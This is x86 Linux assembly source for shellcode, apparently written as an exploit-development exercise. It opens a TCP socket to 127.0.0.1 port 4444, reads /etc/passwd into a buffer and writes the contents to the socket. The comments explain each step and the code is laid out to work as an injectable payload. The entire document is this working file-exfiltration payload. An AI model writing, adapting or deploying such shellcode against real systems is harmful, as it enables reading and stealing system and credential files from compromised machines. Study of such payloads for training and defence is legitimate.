
global _start

section .text

_start:
	; Create a socket
	; eax = 102 (socketcall), ebx = 1 (socket), ecx = esp (2 (AF_INET), 1 (SOCK_STREAM), 0)
	xor ebx, ebx
	mul ebx

	push eax
	or al, 102	; syscall = socketcall
	inc ebx
	push ebx
	push byte 2	;       domain = (AF_INET = 2)
	mov ecx, esp	; pointer of args
	int 0x80


	; Save the returned socket to edi for later use, this is
	;   the first argument of the following syscalls
	xchg edi, eax	; eax (socket)  <=>  edi


	; Connect to a remote port
	add al, 0x01
	shl eax, 24
	add al, 0x7f
	push eax		; socaddr: 0x0100007F = 127.0.0.1

	push word 0x5c11; 0x5c11 = port 4444
	push word 2	; AF_INET = 0x0002
	mov ecx, esp

	; eax = 102 (socketcall), ebx = 3 (connect), ecx = (socket, server struct, 16)
	xor eax, eax
	or al, 102	; syscall = socketcall
	add bl, 2	; connect = 3
	push dword 16	; sockaddr_in: size of sockaddr_in
	push ecx	;              pointer of sockaddr_in
	push edi	;              server socket
	mov ecx, esp    ; pointer of args
	int 0x80


	xchg edi, esi	; socket file descriptor is saved to esi


	jmp short find_address

shellcode:
	; Open the file
	; eax = 5 (open), ebx = pointer to path, ecx = 0 (flags)
	pop ebx         ; ebx = pointer to path
	push eax
	pop ecx		; ecx = 0 (flags)
	add al, 5
	int 0x80

	; Read the file
	; eax = 3 (read), ebx = file descriptor from open file,
	;   ecx = esp, buffer, where we read the file content
	;   edx = 4096, buffer size
	mov ebx, eax	; ebx = file descriptor
	xor eax, eax
	or al, 3
	mov edi, esp	; buffer address is saved to edi
	mov ecx, edi	; ecx = pointer to esp (buffer)
	inc edx
	rol edx, 12	; edx = 4096 (buffer size)
	int 0x80

	; Write to the socket
	; eax = 4 (write), ebx = socket file descriptor (from esi)
	;   ecx = pointer to buffer, edx = (eax return value from
	;   previous syscall)
	mov edx, eax	; edx = bytes read
	xor eax, eax
	mov al, 4
	mov ebx, esi	; esi contains the socket file descriptor
	int 0x80

	; Exit
	; eax = 1 (exit), ebx = 0 (no error)
	xor eax, eax
	push eax
	pop ebx
	inc eax
	int 0x80

find_address:
	call dword shellcode
	path: db '/etc/passwd'
